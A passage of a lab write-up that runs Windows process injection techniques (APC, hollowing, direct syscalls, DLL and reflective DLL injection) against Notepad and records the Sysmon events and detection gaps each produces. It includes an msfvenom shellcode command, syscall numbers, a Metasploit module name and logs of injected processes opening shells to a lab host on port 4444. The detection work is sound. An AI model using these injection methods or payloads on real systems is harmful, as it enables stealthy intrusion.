TargetProcessGUID: {ED9BFE1B-381F-6A04-C702-000000000C00}
TargetProcessId: 3380
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
GrantedAccess: 0x1fffff
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+163514|C:\WINDOWS\System32\KERNELBASE.dll+b0c3a|C:\WINDOWS\System32\KERNELBASE.dll+ae296|C:\WINDOWS\System32\KERNEL32.DLL+3c6e4|C:\Users\jens\Documents\procInj\t3_apc_injection.exe+1601|C:\Users\jens\Documents\procInj\t3_apc_injection.exe+10d9|C:\Users\jens\Documents\procInj\t3_apc_injection.exe+1456|C:\WINDOWS\System32\KERNEL32.DLL+2e8d7|C:\WINDOWS\SYSTEM32\ntdll.dll+8c3fc
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

2. "Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2026-05-13 08:36:47.815
ProcessGuid: {ED9BFE1B-381F-6A04-C802-000000000C00}
ProcessId: 11436
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.8115 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd
CurrentDirectory: C:\Users\jens\Documents\procInj\
User: WIN11\jens
LogonGuid: {ED9BFE1B-2C5D-6A04-436B-060000000000}
LogonId: 0x66b43
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=2EDE04B00B744D0D2D5614E83997022CC3EF3656,MD5=77F0062F490BCC7023763A422E561945,SHA256=14CC8AB1DCF0D9F19E8FB82DEB547CF8C462C56A0E43F7ADDC02641AB3C81651,IMPHASH=B0F049C014592B156EB1FA857E99CEB9
ParentProcessGuid: {ED9BFE1B-381F-6A04-C702-000000000C00}
ParentProcessId: 3380
ParentImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
ParentCommandLine: ""C:\Windows\System32\notepad.exe""
ParentUser: WIN11\jens"

3. "Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2026-05-13 08:36:47.840
SourceProcessGUID: {ED9BFE1B-381F-6A04-C702-000000000C00}
SourceProcessId: 3380
SourceThreadId: 15216
SourceImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
TargetProcessGUID: {ED9BFE1B-381F-6A04-C802-000000000C00}
TargetProcessId: 11436
TargetImage: C:\WINDOWS\system32\cmd.exe
GrantedAccess: 0x1fffff
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+163514|C:\WINDOWS\System32\KERNELBASE.dll+b0c3a|C:\WINDOWS\System32\KERNELBASE.dll+ae153|C:\WINDOWS\System32\KERNELBASE.dll+adcb6|C:\WINDOWS\System32\KERNEL32.DLL+44fd4|UNKNOWN(000002EDA1C401BC)
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

4. "Network connection detected:
RuleName: technique_id=T1571,technique_name=Non-Standard Port
UtcTime: 2026-05-13 08:36:55.124
ProcessGuid: {ED9BFE1B-381F-6A04-C702-000000000C00}
ProcessId: 3380
Image: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
User: WIN11\jens
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.32.39
SourceHostname: -
SourcePort: 52100
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 192.168.32.49
DestinationHostname: -
DestinationPort: 4444
DestinationPortName: -"

### Sysmon Analysis
No EID 8 which confirmed detection gap for APC injection as no thread is created so Sysmon CreateRemoteThread instrumentation never
fires. Detection relies entirely on EID 10 from process handle open where QueueUserAPC leaves no direct Sysmon
footprint.
| Step | Action                                  | Sysmon EID | Rule Triggered          |
|------|-----------------------------------------|------------|-------------------------|
| 1    | Injector opens handle to Notepad        | EID 10     | ProcessInjectionDelux   |
| 2    | Shellcode written to remote memory      | -          | -                       |
| 3    | APC queued to suspended main thread     | -          | -                       |
| 4    | Thread resumed — APC executes           | -          | -                       |
| 5    | Shellcode opens handle to cmd.exe       | EID 10     | ProcessInjectionDelux   |

### Key Indicators
- **EID 8 absent** confirmed gap. QueueUserAPC reuses existing thread, cannot rely on EID 8 for APC detection.
- **EID 10** `GrantedAccess: 0x1fffff` only signal at injection time.
- **EID 10** `UNKNOWN(000002EDA1C401BC)` shellcode executing from
  anonymous memory. Same fingerprint as T1 and T2.


## T4. ProcessHollowing
Process hollowing creates a legitimate process suspended, unmaps its original image from memory, then maps malicious code in its place before resuming. The process looks legitimate from the outside with correct name, path, and PID but runs entirely different code. EID 25 should fire because Sysmon detects the in-memory image no longer matches the on-disk PE. Issue triggering revershell from hollowed process context so instead switch payload to launch calc.exe, however still issue spawning it but sysmon triggers on EID 25:
- msfvenom -p windows/x64/exec CMD=calc.exe -f c --arch x64 --platform windows -b "\x00\x0a\x0d"

| API Call                 | Layer      | Sysmon Event |
|--------------------------|------------|--------------|
| CreateProcess(SUSPENDED) | Win32      | -            |
| NtQueryInformationProcess| Native API | -            |
| ReadProcessMemory()      | Win32      | -            |
| NtUnmapViewOfSection()   | Native API | EID 25       |
| VirtualAllocEx()         | Win32      | -            |
| WriteProcessMemory()     | Win32      | -            |
| SetThreadContext()       | Win32      | -            |
| ResumeThread()           | Win32      | -            |

### Sysmon Data
1. "Process accessed:
RuleName: technique_id=T1055.001,technique_name=ProcessInjectionDelux
UtcTime: 2026-05-13 11:26:48.557
SourceProcessGUID: {ED9BFE1B-5FF8-6A04-1A02-000000000F00}
SourceProcessId: 6860
SourceThreadId: 13532
SourceImage: C:\Users\jens\Documents\procInj\t4_process_hollowing.exe
TargetProcessGUID: {ED9BFE1B-5FF8-6A04-1B02-000000000F00}
TargetProcessId: 10384
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
GrantedAccess: 0x1fffff
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+1636b4|C:\WINDOWS\System32\KERNELBASE.dll+8b82d|C:\WINDOWS\System32\KERNELBASE.dll+88e86|C:\WINDOWS\System32\KERNEL32.DLL+3c624|C:\Users\jens\Documents\procInj\t4_process_hollowing.exe+1624|C:\Users\jens\Documents\procInj\t4_process_hollowing.exe+10d9|C:\Users\jens\Documents\procInj\t4_process_hollowing.exe+1456|C:\WINDOWS\System32\KERNEL32.DLL+2e957|C:\WINDOWS\SYSTEM32\ntdll.dll+427c
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

2. "Process Tampering:
RuleName: -
UtcTime: 2026-05-13 11:26:48.646
ProcessGuid: {ED9BFE1B-5FF8-6A04-1B02-000000000F00}
ProcessId: 10384
Image: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
Type: Image is replaced
User: WIN11\jens"


### Sysmon Analysis
EID 25 fired with Type: Image is replaced, confirms Sysmon detected the in-memory image mismatch caused by NtUnmapViewOfSection removing the original notepad image. Need to add RuleName to config so its not "-".
| Step | Action                                  | Sysmon EID | Rule Triggered          |
|------|-----------------------------------------|------------|-------------------------|
| 1    | Injector opens handle to Notepad        | EID 10     | ProcessInjectionDelux   |
| 2    | NtUnmapViewOfSection removes image      | EID 25     | Process Tampering       |
| 3    | Shellcode written to remote memory      | -          | -                       |
| 4    | Thread context redirected to shellcode  | -          | -                       |
| 5    | Thread resumed                          | -          | -                       |

### Key Indicators
- **EID 25** `Type: Image is replaced` On-disk PE no longer matches in-memory image.
- **EID 10** `GrantedAccess: 0x1fffff` injector opens handle to target.


## T5. Direct Syscall
Direct syscalls bypasses ntdll.dll entirely by executing the syscall instruction directly in your code. EDRs hook ntdll.dll functions in userland to intercept calls but direct syscalls jump straight past those hooks into the kernel. However Sysmon sits in the kernel and sees the same resulting kernel events regardless of how they were triggered.

| API Call                    | Layer          | Sysmon Event |
|-----------------------------|----------------|--------------|
| SysNtOpenProcess()          | Direct Syscall | EID 10       |
| SysNtAllocateVirtualMemory()| Direct Syscall | -            |
| SysNtWriteVirtualMemory()   | Direct Syscall | -            |
| SysNtCreateThreadEx()       | Direct Syscall | EID 8        |

| Function                 | SSN    |
|--------------------------|--------|
| NtOpenProcess            | 0x0026 |
| NtAllocateVirtualMemory  | 0x0018 |
| NtWriteVirtualMemory     | 0x003A |
| NtCreateThreadEx         | 0x00C9 |
| NtProtectVirtualMemory   | 0x0050 |

### Sysmon Data
1. "Process accessed:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2026-05-13 12:15:29.716
SourceProcessGUID: {ED9BFE1B-6B61-6A04-F202-000000000F00}
SourceProcessId: 11744
SourceThreadId: 6944
SourceImage: C:\Users\jens\Documents\procInj\t5_direct_syscall.exe
TargetProcessGUID: {ED9BFE1B-6884-6A04-BD02-000000000F00}
TargetProcessId: 5500
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
GrantedAccess: 0x142a
CallTrace: C:\Users\jens\Documents\procInj\t5_direct_syscall.exe+185a|C:\Users\jens\Documents\procInj\t5_direct_syscall.exe+161c|C:\Users\jens\Documents\procInj\t5_direct_syscall.exe+10d9|C:\Users\jens\Documents\procInj\t5_direct_syscall.exe+1456|C:\WINDOWS\System32\KERNEL32.DLL+2e957|C:\WINDOWS\SYSTEM32\ntdll.dll+427c
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

2. "CreateRemoteThread detected:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2026-05-13 12:15:29.718
SourceProcessGuid: {ED9BFE1B-6B61-6A04-F202-000000000F00}
SourceProcessId: 11744
SourceImage: C:\Users\jens\Documents\procInj\t5_direct_syscall.exe
TargetProcessGuid: {ED9BFE1B-6884-6A04-BD02-000000000F00}
TargetProcessId: 5500
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
NewThreadId: 9912
StartAddress: 0x000001DE7DB20000
StartModule: -
StartFunction: -
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

3. "Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2026-05-13 12:15:29.885
SourceProcessGUID: {ED9BFE1B-6884-6A04-BD02-000000000F00}
SourceProcessId: 5500
SourceThreadId: 9912
SourceImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
TargetProcessGUID: {ED9BFE1B-6B61-6A04-F302-000000000F00}
TargetProcessId: 8056
TargetImage: C:\WINDOWS\system32\cmd.exe
GrantedAccess: 0x1fffff
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+1636b4|C:\WINDOWS\System32\KERNELBASE.dll+8b82d|C:\WINDOWS\System32\KERNELBASE.dll+88d43|C:\WINDOWS\System32\KERNELBASE.dll+888a6|C:\WINDOWS\System32\KERNEL32.DLL+44f14|UNKNOWN(000001DE7DB201BC)
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

4. "Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2026-05-13 12:15:29.877
ProcessGuid: {ED9BFE1B-6B61-6A04-F302-000000000F00}
ProcessId: 8056
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.8328 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd
CurrentDirectory: C:\Users\jens\
User: WIN11\jens
LogonGuid: {ED9BFE1B-5BCF-6A04-9856-1A0000000000}
LogonId: 0x1a5698
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=8EFFECCD068002141AEF22B095A52E1D41656C98,MD5=CED4AA0B4CBF72E2520E0A2CCFF79370,SHA256=D5697FEF6995E992B9232A2B19665A297743427316C7225A5B772F0032F20FCA,IMPHASH=B0F049C014592B156EB1FA857E99CEB9
ParentProcessGuid: {ED9BFE1B-6884-6A04-BD02-000000000F00}
ParentProcessId: 5500
ParentImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
ParentCommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe"" RestartByRestartManager:* 
ParentUser: WIN11\jens"

5. "Network connection detected:
RuleName: technique_id=T1571,technique_name=Non-Standard Port
UtcTime: 2026-05-13 12:15:27.820
ProcessGuid: {ED9BFE1B-6884-6A04-BD02-000000000F00}
ProcessId: 5500
Image: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
User: WIN11\jens
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.32.39
SourceHostname: -
SourcePort: 63893
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 192.168.32.49
DestinationHostname: -
DestinationPort: 4444
DestinationPortName: -"

### Sysmon Analysis 
Direct syscalls produce identical kernel events as previous techniques as Sysmon kernel callbacks are completely unaffected by userland hook bypass. The key difference vs T1 and T2 is in the
EID 10 CallTrace and GrantedAccess value. NtOpenProcess via direct syscall enforces exact rights more strictly than Win32 OpenProcess. T5 CallTrace shows KERNELBASE.dll is absent from chain in T1/T2 it appeared between
ntdll and the injector binary because OpenProcess routes through it. In T5 the syscall jumps directly from the injector into the kernel bypassing KERNELBASE.dll entirely where OpenProcess actually lives. KERNEL32.DLL+2e957 in calltrace is from the mingw CRT runtime initialisation.

| Step | Action                              | Sysmon EID | Rule Triggered          |
|------|-------------------------------------|------------|-------------------------|
| 1    | SysNtOpenProcess to Notepad         | EID 10     | Process Injection       |
| 2    | SysNtAllocateVirtualMemory          | -          | -                       |
| 3    | SysNtWriteVirtualMemory             | -          | -                       |
| 4    | SysNtCreateThreadEx creates thread  | EID 8      | T1055 Process Injection |
| 5    | Shellcode opens handle to cmd.exe   | EID 10     | ProcessInjectionDelux   |

### Key Indicators
- **EID 10** `GrantedAccess: 0x142a` first time minimal access mask
  appears in lab. Direct syscall requested exact rights needed, kernel
  granted them without promotion to 0x1fffff. Confirms access mask
  promotion observed in T1-T3 was a Win32 API behavior not a kernel behavior.
- **EID 10** `CallTrace: t5_direct_syscall.exe+185a` ntdll and KERNELBASE
  completely absent from injector call chain. Direct jump from binary into
  kernel with only KERNEL32 visible for CRT runtime. Strongest CallTrace
  difference vs all previous techniques.
- **EID 8** `StartModule: -` identical to T1 and T2. Kernel thread
  creation event survives complete bypass of userland API stack.
- **EID 10** `UNKNOWN(000001DE7DB201BC)` shellcode executing from
  anonymous memory. Same fingerprint as all previous techniques.


## T6. DLL Injection
Loads a malicious DLL into a target process by writing the DLL path into remote memory and creating a thread that calls LoadLibraryA with that path as its argument. Key difference from T1-T5 instead of writing raw shellcode, a legitimate Windows API function is used as the thread entry point. This changes the EID 8 StartModule from anonymous memory to kernel32.dll.
| API Call              | Layer | Sysmon Event              |
|-----------------------|-------|---------------------------|
| OpenProcess()         | Win32 | EID 10                    |
| VirtualAllocEx()      | Win32 | —                         |
| WriteProcessMemory()  | Win32 | —                         |
| CreateRemoteThread()  | Win32 | EID 8                     |
| LoadLibraryA()        | Win32 | EID 7 (fires in target)   |


### Sysmon Data
1."Process accessed:
RuleName: -
UtcTime: 2026-05-15 12:30:01.559
SourceProcessGUID: {ED9BFE1B-11C9-6A07-2D02-000000001200}
SourceProcessId: 9732
SourceThreadId: 12320
SourceImage: C:\Users\jens\Documents\procInj\t6_dll_injection.exe
TargetProcessGUID: {ED9BFE1B-11B4-6A07-2702-000000001200}
TargetProcessId: 8488
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
GrantedAccess: 0x102a
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+162164|C:\WINDOWS\System32\KERNELBASE.dll+360c6|C:\Users\jens\Documents\procInj\t6_dll_injection.exe+15f7|C:\Users\jens\Documents\procInj\t6_dll_injection.exe+10d9|C:\Users\jens\Documents\procInj\t6_dll_injection.exe+1456|C:\WINDOWS\System32\KERNEL32.DLL+2e957|C:\WINDOWS\SYSTEM32\ntdll.dll+427c
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

2. "CreateRemoteThread detected:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2026-05-15 12:30:01.568
SourceProcessGuid: {ED9BFE1B-11C9-6A07-2D02-000000001200}
SourceProcessId: 9732
SourceImage: C:\Users\jens\Documents\procInj\t6_dll_injection.exe
TargetProcessGuid: {ED9BFE1B-11B4-6A07-2702-000000001200}
TargetProcessId: 8488
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
NewThreadId: 5876
StartAddress: 0x00007FFFCB662CD0
StartModule: C:\WINDOWS\System32\KERNEL32.DLL
StartFunction: LoadLibraryA
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

3. "Image loaded:
RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
UtcTime: 2026-05-15 12:30:01.570
ProcessGuid: {ED9BFE1B-11B4-6A07-2702-000000001200}
ProcessId: 8488
Image: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
ImageLoaded: C:\Users\jens\Documents\procInj\evil.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA1=ED5ED0DA134DD336D31ED412B6AA1AD5D9A5B534,MD5=7017E650A3A097CB6932206B8A82E1C9,SHA256=B4F00DB66CFDFABF31CDE5263A4772E1E4B259060A6B0B11304266C207DCD8C8,IMPHASH=57D6E7112C8E716CFE2EB0FF9F36763C
Signed: false
Signature: -
SignatureStatus: Unavailable
User: WIN11\jens"

4. "Process Create:
RuleName: technique_id=T1218.011,technique_name=rundll32.exe
UtcTime: 2026-05-15 12:30:01.574
ProcessGuid: {ED9BFE1B-11C9-6A07-2E02-000000001200}
ProcessId: 13792
Image: C:\Windows\System32\rundll32.exe
FileVersion: 10.0.26100.8328 (WinBuild.160101.0800)
Description: Windows host process (Rundll32)
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: rundll32.exe
CurrentDirectory: C:\Users\jens\Downloads\Sysmon\
User: WIN11\jens
LogonGuid: {ED9BFE1B-0816-6A07-E88D-0E0000000000}
LogonId: 0xe8de8
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=6B4C923EA1962AD6D589CB37DFB72219ECDBE909,MD5=20CC346F589DF2537A759DA1F8020B85,SHA256=4D90FFF3E33BF3CB2BEA5E08E648732503A3116F8C26359D39CB1DAA6E29A964,IMPHASH=C8B70D465C35D895C4171BAF042BB63A
ParentProcessGuid: {ED9BFE1B-11B4-6A07-2702-000000001200}
ParentProcessId: 8488
ParentImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
ParentCommandLine: ""C:\WINDOWS\system32\notepad.exe"" 
ParentUser: WIN11\jens"

5. "Process accessed:
RuleName: -
UtcTime: 2026-05-15 12:30:01.579
SourceProcessGUID: {ED9BFE1B-11B4-6A07-2702-000000001200}
SourceProcessId: 8488
SourceThreadId: 5876
SourceImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
TargetProcessGUID: {ED9BFE1B-11C9-6A07-2E02-000000001200}
TargetProcessId: 13792
TargetImage: C:\WINDOWS\system32\rundll32.exe
GrantedAccess: 0x1fffff
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+1636b4|C:\WINDOWS\System32\KERNELBASE.dll+8b82d|C:\WINDOWS\System32\KERNELBASE.dll+88d43|C:\WINDOWS\System32\KERNELBASE.dll+888a6|C:\WINDOWS\System32\KERNEL32.DLL+44f14|C:\Users\jens\Documents\procInj\evil.dll+10ef|C:\Users\jens\Documents\procInj\evil.dll+1248|C:\WINDOWS\SYSTEM32\ntdll.dll+15f98a|C:\WINDOWS\SYSTEM32\ntdll.dll+12d23|C:\WINDOWS\SYSTEM32\ntdll.dll+6fc9c|C:\WINDOWS\SYSTEM32\ntdll.dll+5b0a|C:\WINDOWS\SYSTEM32\ntdll.dll+4c93|C:\WINDOWS\SYSTEM32\ntdll.dll+b6e4|C:\WINDOWS\SYSTEM32\ntdll.dll+b2f0|C:\WINDOWS\SYSTEM32\ntdll.dll+59370|C:\WINDOWS\System32\KERNELBASE.dll+337bf|C:\WINDOWS\System32\KERNELBASE.dll+ee1bd|C:\WINDOWS\System32\KERNEL32.DLL+2e957|C:\WINDOWS\SYSTEM32\ntdll.dll+427c
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

6. "Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2026-05-15 12:30:01.624
ProcessGuid: {ED9BFE1B-11C9-6A07-2F02-000000001200}
ProcessId: 12252
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.8328 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd
CurrentDirectory: C:\Users\jens\Downloads\Sysmon\
User: WIN11\jens
LogonGuid: {ED9BFE1B-0816-6A07-E88D-0E0000000000}
LogonId: 0xe8de8
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=8EFFECCD068002141AEF22B095A52E1D41656C98,MD5=CED4AA0B4CBF72E2520E0A2CCFF79370,SHA256=D5697FEF6995E992B9232A2B19665A297743427316C7225A5B772F0032F20FCA,IMPHASH=B0F049C014592B156EB1FA857E99CEB9
ParentProcessGuid: {ED9BFE1B-11C9-6A07-2E02-000000001200}
ParentProcessId: 13792
ParentImage: C:\Windows\System32\rundll32.exe
ParentCommandLine: rundll32.exe
ParentUser: WIN11\jens"

7. "Network connection detected:
RuleName: technique_id=T1571,technique_name=Non-Standard Port
UtcTime: 2026-05-15 12:30:01.264
ProcessGuid: {ED9BFE1B-11C9-6A07-2E02-000000001200}
ProcessId: 13792
Image: C:\WINDOWS\system32\rundll32.exe
User: WIN11\jens
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.32.12
SourceHostname: -
SourcePort: 50972
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 192.168.32.49
DestinationHostname: -
DestinationPort: 4444
DestinationPortName: -"

### Sysmon Analysis
EID 10 for t6_dll_injection.exe opening handle to Notepad was not present in the events at first tries. Only post-injection activity visible in EID 10. Checked GrantedAccess and it was generating 0x102a which is:
```
PROCESS_VM_WRITE          0x0020
PROCESS_VM_OPERATION      0x0008
PROCESS_CREATE_THREAD     0x0002
PROCESS_QUERY_LIMITED_INFORMATION 0x1000
Total                     0x102a
```
Updated ProcessInjectionDelux config in Sysmon EID 10 to include 0x102a but also 0x042a, 0x043a and 0x0428 to cover variants with the PROCESS_QUERY_LIMITED_INFORMATION bit. Now GrantedAccess looks for include on (0x1FFFFF;0x1F0FFF;0x1F1FFF;0x1F2FFF;0x1F3FFF;0x143A;0x147A;0x047A;0x1410;0x1438;0x0478;0x1010;0x042A;0x43A;0x0428;0x102A;0x1428). Will need to create specific include filters else it will be noisy.

| Step | Action                                  | Sysmon EID | Rule Triggered           |
|------|-----------------------------------------|------------|--------------------------|
| 1    | Injector opens handle to Notepad        | EID 10     | ProcessInjectionDelux    |
| 2    | DLL path written to remote memory       | -          | -                        |
| 3    | CreateRemoteThread(LoadLibraryA)        | EID 8      | T1055 Process Injection  |
| 4    | LoadLibraryA loads evil.dll             | EID 7      | T1574.002 DLL Side-Load  |
| 5    | evil.dll opens handle to rundll32       | EID 10     | ProcessInjectionDelux    |

### Key Indicators
- **EID 8** `StartModule: kernel32.dll` thread starts from named
  legitimate module. StartFunction: LoadLibraryA visible strong DLL injection indicator.
- **EID 7** `ImageLoaded: C:\Users\jens\Documents\procInj\evil.dll` unsigned DLL loaded from
  suspicious path.
- **EID 10** `CallTrace: evil.dll+10ef` named DLL module visible in
  call trace. Different from T1-T5 where UNKNOWN appeared.
- **EID 10** `UNKNOWN(00000191BE240195)` shellcode inside evil.dll
  executing from anonymous memory. DLL loaded itself then unpacked
  shellcode into allocated memory.


## T7. Reflective DLL Injection
Loads a DLL into a target process without using LoadLibraryA. Instead the DLL contains a custom loader function that maps itself into memory, resolves its own imports and relocations, then executes. The key detection difference from T6 is that no LoadLibrary call is made and the DLL never appears as a formally loaded module through the Windows loader. Used https://github.com/stephenfewer/ReflectiveDLLInjection with Metasploit module "windows/manage/reflective_dll_inject" to run this lab. It is assumeed that the attacker has already gained a meterpreter shell from the victim system before running this. 
| API Call                  | Layer  | Sysmon Event          |
|---------------------------|--------|-----------------------|
| OpenProcess()             | Win32  | EID 10                |
| VirtualAllocEx()          | Win32  | —                     |
| WriteProcessMemory()      | Win32  | —                     |
| CreateRemoteThread()      | Win32  | EID 8                 |
| ReflectiveLoader()        | Custom | — (self-mapping)      |

<img width="1840" height="1162" alt="image" src="https://github.com/user-attachments/assets/52af37b7-98ff-4592-90bb-041d70e78c51" />

### Sysmon Data (Metasploit session)
1. "Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2026-05-15 14:21:28.893
SourceProcessGUID: {ED9BFE1B-273D-6A07-4D03-000000001200}
SourceProcessId: 7508
SourceThreadId: 14128
SourceImage: C:\Users\jens\Documents\procInj\meter.exe
TargetProcessGUID: {ED9BFE1B-28A4-6A07-5503-000000001200}
TargetProcessId: 6576
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
GrantedAccess: 0x1410
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+162164|C:\WINDOWS\System32\KERNELBASE.dll+360c6|UNKNOWN(0000000000CBDDFC)
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

2. "Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2026-05-15 14:21:28.897
SourceProcessGUID: {ED9BFE1B-273D-6A07-4D03-000000001200}
SourceProcessId: 7508
SourceThreadId: 14128
SourceImage: C:\Users\jens\Documents\procInj\meter.exe
TargetProcessGUID: {ED9BFE1B-2BA8-6A07-6E03-000000001200}
TargetProcessId: 3244
TargetImage: C:\WINDOWS\system32\svchost.exe
GrantedAccess: 0x1410
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+162164|C:\WINDOWS\System32\KERNELBASE.dll+360c6|UNKNOWN(0000000000CBDDFC)
SourceUser: WIN11\jens
TargetUser: NT instans\SYSTEM"

3. "Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2026-05-15 14:21:29.013
SourceProcessGUID: {ED9BFE1B-273D-6A07-4D03-000000001200}
SourceProcessId: 7508
SourceThreadId: 6420
SourceImage: C:\Users\jens\Documents\procInj\meter.exe
TargetProcessGUID: {ED9BFE1B-28A4-6A07-5503-000000001200}
TargetProcessId: 6576
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
GrantedAccess: 0x3fff
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+162164|C:\WINDOWS\System32\KERNELBASE.dll+360c6|UNKNOWN(0000000000CBBCEF)
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

4. "CreateRemoteThread detected:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2026-05-15 14:21:29.545
SourceProcessGuid: {ED9BFE1B-273D-6A07-4D03-000000001200}
SourceProcessId: 7508
SourceImage: C:\Users\jens\Documents\procInj\meter.exe
TargetProcessGuid: {ED9BFE1B-28A4-6A07-5503-000000001200}
TargetProcessId: 6576
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
NewThreadId: 6784
StartAddress: 0x0000019F7C320448
StartModule: -
StartFunction: -
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

## Sysmon Analysis
EID 7 completely absent confirmed detection gap for reflective DLL injection as Windows loader never called so PsSetLoadImageNotifyRoutine. No DLL path, no hashes, no signature info logged.
Two different GrantedAccess values observed as Metasploit uses multiple handle opens with different rights for reconnaissance then injection. Bitvalue 0x3fff should be added to config. Notable ran command ps in Metasploit which caused meter.exe to open handle to svchost.exe. Reflective DLL injection is significantly stealthier than standard T6 DLL injection from an EID 7 perspective. Detection relies on EID 8 with "StartModule: -" and EID 10 UNKNOWN in CallTrace.

| Step | Action                                   | Sysmon EID | Rule Triggered           |
|------|------------------------------------------|------------|--------------------------|
| 1    | meter.exe opens handle to Notepad        | EID 10     | DLL Injection            |
| 2    | meter.exe opens handle to svchost        | EID 10     | DLL Injection            |
| 3    | meter.exe opens elevated handle to Notepad| EID 10    | DLL Injection            |
